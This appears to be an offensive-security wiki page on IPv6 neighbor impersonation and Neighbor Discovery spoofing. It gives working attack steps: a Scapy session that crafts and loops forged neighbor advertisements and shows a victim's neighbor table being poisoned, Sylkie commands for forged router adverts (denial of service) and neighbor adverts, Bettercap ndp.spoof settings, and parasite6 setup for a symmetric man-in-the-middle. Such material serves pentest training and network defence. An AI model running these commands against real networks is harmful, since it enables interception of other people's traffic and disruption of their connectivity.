# Neighbor Impersonation

## IPv6 Neighbor Discovery

While it's true ARP does not exist in the IPv6 protocol stack, IPv6 instead relies on ICMPv6 for many of the same operations carried out via ARP under IPv4. Collectively, these functions make up IPv6's [Neighbor Discovery (ND)](https://packetlife.net/blog/2008/aug/28/ipv6-neighbor-discovery/) protocol, described in [RFC 4861](http://tools.ietf.org/html/rfc4861).

Most similar to typical ARP usage under IPv4 is the ND address resolution function, which is used when a host wants to transmit to an on-link prefix but doesn't yet know the layer two address of the destination host. The sending host multicasts a neighbor solicitation, and the destination host, if reachable, responds with a neighbor advertisement containing its layer two address.

![](<../../.gitbook/assets/image (290) (1).png>)

Unfortunately, as in ARP, these exchanges are completely unsecured. There are no countermeasures in place to prevent an attacker from generating a neighbor advertisement advertising his own layer two address as belonging to other hosts on the link.

![](<../../.gitbook/assets/image (291) (1) (1).png>)

## Exploitation

The IPv6 Neighbor Impersonation MitM attack is particularly useful when exploiting link-local autoconfiguration nodes (using the address prefix FE80::/10) and when the attack intends to exploit a limited number of IPv6 targets. Since the attacker must send ICMPv6 NS messages frequently for each victim on the network, this attack does not scale well where lots of target devices are being exploited. In wide-scale IPv6 MitM attacks, an alternate attack technique using router impersonation is recommended.



## Using Scapy

We can put this theory into practice by fabricating our own custom neighbor advertisements and unicasting them to our intended victim. For this example, we'll use Scapy to craft our malicious advertisement layer by layer:

```
>>> ls(Ether)
dst        : DestMACField         = (None)
src        : SourceMACField       = (None)
type       : XShortEnumField      = (0)
>>> ether=(Ether(dst='00:00:00:00:00:0b', src='00:00:00:00:00:0c'))
>>> ls(IPv6)
version    : BitField             = (6)
tc         : BitField             = (0)
fl         : BitField             = (0)
plen       : ShortField           = (None)
nh         : ByteEnumField        = (59)
hlim       : ByteField            = (64)
src        : SourceIP6Field       = (None)
dst        : IP6Field             = ('::1')
>>> ipv6=IPv6(src='fe80::1', dst='fe80::2')
>>> ls(ICMPv6ND_NA)
type       : ByteEnumField        = (136)
code       : ByteField            = (0)
cksum      : XShortField          = (None)
R          : BitField             = (1)
S          : BitField             = (0)
O          : BitField             = (1)
res        : XBitField            = (0)
tgt        : IP6Field             = ('::')
>>> na=ICMPv6ND_NA(tgt='fe80::1', R=0)
>>> ls(ICMPv6NDOptDstLLAddr)
type       : ByteField            = (2)
len        : ByteField            = (1)
lladdr     : MACField             = ('00:00:00:00:00:00')
>>> lla=ICMPv6NDOptDstLLAddr(lladdr='00:00:00:00:00:0c')
```

Once we've constructed the individual layers of the packet, we can see how they look after being welded together (notice that Scapy will handle minor aspects automatically, like setting the Ethernet type field to 0x86dd for IPv6).

```
>>> (ether/ipv6/na/lla).display()
###[ Ethernet ]###
  dst= 00:00:00:00:00:0b
  src= 00:00:00:00:00:0c
  type= 0x86dd
###[ IPv6 ]###
   version= 6
   tc= 0
   fl= 0
   plen= None
   nh= ICMPv6
   hlim= 255
   src= fe80::1
   dst= fe80::2
###[ ICMPv6 Neighbor Discovery - Neighbor Advertisement ]###
    type= Neighbor Advertisement
    code= 0
    cksum= 0x0
    R= 0
    S= 0
    O= 1
    res= 0x0
    tgt= fe80::1
###[ ICMPv6 Neighbor Discovery Option - Destination Link-Layer Address ]###
       type= 2
       len= 1
       lladdr= 00:00:00:00:00:0c
```

We can now inject this packet at regular intervals onto the LAN. The following command within Scapy will retransmit the packet every five seconds:

```
>>> sendp(ether/ipv6/na/lla, iface='br0', loop=1, inter=5)
```

At a console on the victim machine (running Linux), we can use the `ip` utility to monitor IPv6 neighbors on the link. Notice that the MAC address for fe80::1 is initially listed as `00:00:00:00:00:0a`, the legitimate gateway, but as soon as we begin injecting our malicious neighbor advertisement, the entry is updated to `00:00:00:00:00:0c`, our attacking machine

```
//Victim$ ip neigh show dev eth0
fe80::1 lladdr 00:00:00:00:00:0a REACHABLE
Victim$ ip neigh show dev eth0
fe80::1 lladdr 00:00:00:00:00:0a REACHABLE
Victim$ ip neigh show dev eth0
fe80::1 lladdr 00:00:00:00:00:0a REACHABLE
Victim$ ip neigh show dev eth0
fe80::1 lladdr 00:00:00:00:00:0c DELAY
Victim$ ip neigh show dev eth0
fe80::1 lladdr 00:00:00:00:00:0c REACHABLE
Victim$ ip neigh show dev eth0
fe80::1 lladdr 00:00:00:00:00:0c REACHABLE
Victim$ ip neigh show dev eth0
fe80::1 lladdr 00:00:00:00:00:0c REACHABLE
```

## Sylkie

Sylkie is a command line device and library for testing systems for normal address spoofing security vulnerabilities in IPv6 systems utilizing the Neighbor Discovery Protocol. This venture is still in the early periods of advancement. On the off chance that you keep running into any issues, please consider presenting an issue. It presently just keeps running on Linux.

```
git clone https://github.com/dlrobertson/sylkie
cd ./sylkie
mkdir -p ./build
cd ./build
cmake -DCMAKE_BUILD_TYPE=Release ..
make
make install
```

```
sylkie -h
```

### DoS (Router Advert)

The basic usage of the router-advert command is listed below. This command will send a Router Advertisement message to the given ip or the all nodes multicast addres causing the targeted nodes to remove / from their list of default routes.

```
sylkie ra -i <interface> \
--target-mac <mac of router> \
--router-ip <ip of router> \
--prefix <router prefix> \
--timeout <time between adverts> \
--repeat <number of times to send the request>
```

Router Advert Examples

```
sylkie ra -i ens3 \
--target-mac 52:54:00:e3:f4:06 \
--router-ip fe80::b95b:ee1:cafe:9720 \
--prefix 64 \
--repeat -1 \
--timeout 10
```

This would send a “forged” Router Advertisement to the link local scope all-nodes address ff02::1 causing all of the nodes to remove fe80::b95b:ee1:cafe:9720/64 (link-layer address 52:54:00:e3:f4:06) from their list of default routes.

### Address spoofing (Neighbor Advert)

The basic usage of the sylkie neighbor advert command is listed below. This command will send a forged Neighbor Advertisement message to the given ip

```
sylkie na -i <interface> \
--dst-mac <dest hw addr> \
--src-ip <source ip> \
--dst-ip <dest ip address> \
--target-ip <target ip address> \
--target-mac <target mac address> \
--timeout <time betweeen adverts> \
--repeat <number of times to send the request>
```

Neighbor Advert examples

```
sylkie na -i ens3 \
--dst-mac 52:54:00:e3:f4:06 \
--src-ip fe80::61ad:fda3:3032:f6f4 \
--dst-ip fe80::b95b:ee1:cafe:9720 \
--target-ip fe80::61ad:fda3:3032:f6f4 \
--target-mac 52:54:00:c2:a7:7c \
--repeat -1 \
--timeout 3
```

## Bettercap

NDP.SPOOF (IPV6)

This module performs IPv6 neighbor spoofing by sending crafted neighbor and router advertisement packets.

```
ndp.spoof on / off
```

#### Parameters <a href="#parameters" id="parameters"></a>

| parameter                 | default   | description                                                          |
| ------------------------- | --------- | -------------------------------------------------------------------- |
| `ndp.spoof.neighbour`     | `fe80::1` | Neighbour IPv6 address to spoof, clear to disable NA.                |
| `ndp.spoof.prefix`        | `d00d::`  | IPv6 prefix for router advertisements spoofing, clear to disable RA. |
| `ndp.spoof.prefix.length` | `64`      | IPv6 prefix length for router advertisements.                        |
| `ndp.spoof.targets`       | -         | Comma separated list of IPv6 victim addresses.                       |

## Parasite6

#### Implemented by THC-IPV6  toolkit

{% embed url="https://github.com/vanhauser-thc/thc-ipv6" %}

First, the attacker must configure his Linux host to forward IPv6 traffic as a router using sysctl, setting net.ipv6.conf.all.forwarding to 1. Next, the attacker starts the parasite6 tool using the "-l" flag to loop and continue delivering the poisoned ICMPv6 NS messages. To establish a symmetric MitM attack, the attacker also specifies the "-R" argument, which will instruct parasite6 to send unsolicited ICMPv6 NS messages to the destination IPv6 node as well.

#### Installation

```
apt install thc-ipv6
```

#### run attack

```
sysctl -w net.ipv6.conf.all.forward=1
atk6-parasite6  -lR wlan0
```
